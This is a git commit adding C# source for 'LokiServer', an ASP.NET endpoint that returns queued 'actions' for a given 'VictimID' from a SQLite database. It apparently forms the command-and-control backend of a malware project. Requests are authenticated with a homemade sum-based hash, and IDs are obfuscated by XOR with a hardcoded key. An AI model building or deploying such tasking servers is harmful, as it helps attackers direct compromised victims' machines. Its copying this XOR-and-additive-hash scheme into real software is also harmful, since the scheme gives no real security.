0b252a51b3b60a50cb110ff8b38d63ec6d7f95a5
S12cybersecurity <79543461+S12cybersecurity@users.noreply.github.com>
2024-02-19 23:19:31 +0100

    HTTP POST Request Secure

---
+++ LokiServer/LokiServer/Controllers/ActionController.cs
@@ -0,0 +1,48 @@
+﻿using System;
+using System.Data.SQLite;
+using Microsoft.AspNetCore.Mvc;
+using LokiServer;
+using Microsoft.Extensions.Hosting;
+
+namespace LokiServer.Controllers
+{
+
+    public class Request
+    {
+        public string id { get; set; }
+    }
+
+    [ApiController]
+    [Route("[controller]")]
+    public class ActionController : Controller
+    {
+        [HttpPost]
+        public string Post([FromBody] Request id)
+        {
+            string host = Request.Host.Value;
+            string XAppTimestamp = Request.Headers["X-App-Timestamp"];
+            string XAppSignature = Request.Headers["X-App-Signature"];
+            string url = "/Action";
+            if (Utils.validateAPIRequest(XAppTimestamp, XAppSignature, url, Request.Method))
+            {
+                string decryptedID = Utils.XOR(id.id, "S12Secret");
+                SQLiteConnection conn = new SQLiteConnection("Data Source=lokiDB.db;Version=3;");
+                conn.Open();
+                string query = "SELECT * FROM Action WHERE VictimID = @VictimID";
+
+                using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
+                {
+                    cmd.Parameters.AddWithValue("@VictimID", decryptedID);
+                    using SQLiteDataReader reader = cmd.ExecuteReader();
+                    if (reader.Read())
+                    {
+                        string actionID = reader.GetInt32(reader.GetOrdinal("ActionID")).ToString();
+                        string action = reader.GetInt32(reader.GetOrdinal("ID")).ToString();
+                        return actionID + "," + action;
+                    }
+                }
+            }
+            return "";
+        }
+    }
+}
---
+++ LokiServer/LokiServer/Utils.cs
@@ -0,0 +1,61 @@
+﻿using System.Security.Cryptography;
+using System.Text;
+
+namespace LokiServer
+{
+    public class Utils
+    {
+        public static string XOR(string input, string key)
+        {
+            string output = "";
+            for (int i = 0; i < input.Length; i++)
+            {
+                output += (char)(input[i] ^ key[i % key.Length]);
+            }
+            return output;
+        }
+
+        public static int S12hash(string str)
+        {
+            int sum = 0;
+            foreach (char ch in str)
+            {
+                sum += (int)ch;
+            }
+            sum = sum * 83 + 12;
+            return sum;
+        }
+
+        public static ulong CreateS12Hash(string str)
+        {
+            int h1 = S12hash(str);
+            int h2 = S12hash(new string(str.Reverse().ToArray()));
+            int h3 = h2 / 12;
+
+            string hashValue = $"{h1}{h2}{h3}";
+
+            ulong finalHashValue = ulong.Parse(hashValue) * (83 + 12);
+            return finalHashValue;
+        }
+
+        public static bool validateAPIRequest(string XAppTimestamp, string XAppSignature, string url, string method)
+        {
+            string signatureData = method + url + XAppTimestamp;
+            ulong computedSignature = CreateS12Hash(signatureData);
+
+            if (computedSignature.ToString() == XAppSignature)
+            {
+                DateTime timestamp = DateTime.Parse(XAppTimestamp);
+                if (DateTime.Now.Subtract(timestamp).TotalMinutes < 10)
+                {
+                    return true;
+                }
+                else
+                {
+                    return false;
+                }
+            }
+            return false;
+        }
+    }
+}
